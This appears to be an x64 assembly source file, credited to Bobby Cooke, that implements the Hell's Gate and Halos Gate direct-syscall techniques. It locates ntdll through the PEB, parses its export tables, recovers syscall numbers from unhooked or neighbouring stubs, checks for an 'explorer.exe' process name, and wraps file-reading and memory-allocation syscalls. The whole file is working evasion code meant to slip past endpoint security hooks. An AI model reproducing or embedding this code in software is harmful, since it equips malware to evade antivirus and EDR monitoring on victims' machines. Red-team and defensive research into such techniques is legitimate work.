; Author: Bobby Cooke @0xBoku
; Credits / References: Pavel Yosifovich (@zodiacon), Reenz0h from @SEKTOR7net, 
; smelly__vx & am0nsec (Creators/Publishers of the Hells Gate technique)

default rel 

section .text
; export all symbols
global getntdll
global getExportTable
global getExAddressTable
global getExNamePointerTable
global getExOrdinalTable
global getApiAddr
global getApiAddrLoop
global getApiAddrFin
global findSyscallNumber
global halosGateUp
global halosGateDown
global error
global HellsGate
global HellDescent
global compExplorer
global NtAllocateVirtualMemoryHalos
global NtReadFileHalos
global NtOpenFileHalos
global NtQueryInformationFileHalos
extern syscallRead
extern syscallOpen
extern syscallFile
extern syscallAllocate
extern ssnReadFile
extern ssnAllocate
extern ssnOpenFile
extern ssnFileInformation

getntdll:
    xor rdi, rdi
    mul rdi
    mov rbx, gs:[rax+60h]
    mov rbx, [rbx+18h]
    mov rbx, [rbx+20h]
    mov rbx, [rbx]
    mov rbx, [rbx+20h]
    mov rax, rbx
    ret

getExportTable:
    mov rbx, rcx
    mov r8, rcx
    mov ebx, [rbx+3Ch]
    add rbx, r8
    xor rcx, rcx
    add cx, 88ffh
    shr rcx, 8h
    mov edx, [rbx+rcx]
    add rdx, r8
    mov rax, rdx
    ret

getExAddressTable:
    mov r8, rdx
    mov rdx, rcx
    xor r10, r10
    mov r10d, [rdx+1Ch]
    add r10, r8
    mov rax, r10
    ret

getExNamePointerTable:
    mov r8, rdx
    mov rdx, rcx
    xor r11, r11
    mov r11d, [rdx+20h]
    add r11, r8
    mov rax, r11
    ret

getExOrdinalTable:
    mov r8, rdx
    mov rdx, rcx
    xor r12, r12
    mov r12d, [rdx+24h]
    add r12, r8
    mov rax, r12
    ret

getApiAddr:
    mov r10, r9
    mov r11, [rsp+28h]
    mov r12, [rsp+30h]
    xor rax, rax
    push rcx
    jmp short getApiAddrLoop

getApiAddrLoop:
    mov rcx, [rsp]
    xor rdi, rdi
    mov edi, [r11+rax*4]
    add rdi, r8
    mov rsi, rdx
    repe cmpsb
    je getApiAddrFin
    inc rax
    jmp short getApiAddrLoop

getApiAddrFin:
    pop rcx
    mov ax, [r12+rax*2]
    mov eax, [r10+rax*4]
    add rax, r8
    ret

findSyscallNumber:
    xor rsi, rsi
    xor rdi, rdi
    mov rsi, 00B8D18B4Ch
    mov edi, [rcx]
    cmp rsi, rdi
    jne error
    xor rax, rax
    mov ax, [rcx+4]
    ret

halosGateUp:
    xor rsi, rsi
    xor rdi, rdi
    mov rsi, 00B8D18B4Ch
    xor rax, rax
    mov al, 20h
    mul dx
    add rcx, rax
    mov edi, [rcx]
    cmp rsi, rdi
    jne error
    xor rax, rax
    mov ax, [rcx+4]
    ret

halosGateDown:
    xor rsi, rsi
    xor rdi, rdi
    mov rsi, 00B8D18B4Ch
    xor rax, rax
    mov al, 20h
    mul dx
    sub rcx, rax
    mov edi, [rcx]
    cmp rsi, rdi
    jne error
    xor rax, rax
    mov ax, [rcx+4]
    ret

error:
    xor rax, rax
    ret

HellsGate:
    xor r11, r11
    mov r11d, ecx
    ret

HellDescent:
    xor rax, rax
    mov r10, rcx
    mov eax, r11d
    syscall
    ret

compExplorer:
    xor rsi, rsi
    cmp rsi, rcx
    je error
    mov rsi, 6c007000780065h
    mov rdx, [rcx]
    cmp rsi, rdx
    jne error
    mov rsi, 7200650072006fh
    mov rdx, [rcx+8h]
    cmp rsi, rdx
    jne error
    mov rsi, 6500780065002eh
    mov rdx, [rcx+10h]
    cmp rsi, rdx
    jne error
    mov rax, 1h
    ret

NtReadFileHalos:
    mov r10, rcx
    mov eax, [rel ssnReadFile]
    jmp [rel syscallRead]

NtAllocateVirtualMemoryHalos:
    mov r10, rcx
    mov eax, [rel ssnAllocate]
    jmp [rel syscallAllocate]

NtOpenFileHalos:
    mov r10, rcx
    mov eax, [rel ssnOpenFile]
    jmp [rel syscallOpen]

NtQueryInformationFileHalos:
    mov r10, rcx
    mov eax, [rel ssnFileInformation]
    jmp [rel syscallFile]